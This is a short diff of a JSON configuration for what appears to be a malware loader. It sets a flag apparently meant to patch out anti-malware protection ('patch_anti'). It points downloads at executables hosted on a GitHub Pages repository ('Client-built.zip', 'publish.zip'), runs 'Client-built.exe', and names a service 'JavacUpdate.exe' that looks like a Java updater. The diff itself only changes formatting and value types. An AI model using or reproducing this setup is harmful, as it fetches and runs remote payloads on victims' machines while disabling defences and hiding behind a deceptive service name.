@@ -1,11 +1,11 @@
 {
-  "patch_anti":  true,
+  "patch_anti": true,
   "download": true,
   "download_zip": "https://github.com/akramex/akramex.github.io/raw/main/Client-built.zip",
   "zip_path": "1",
   "path": "1",
   "exe_name": "Client-built.exe",
-  "do_patch": 1,
+  "do_patch": true,
   "download_service": "https://github.com/akramex/akramex.github.io/raw/main/publish.zip",
   "service": "false",
   "service_name": "JavacUpdate.exe",
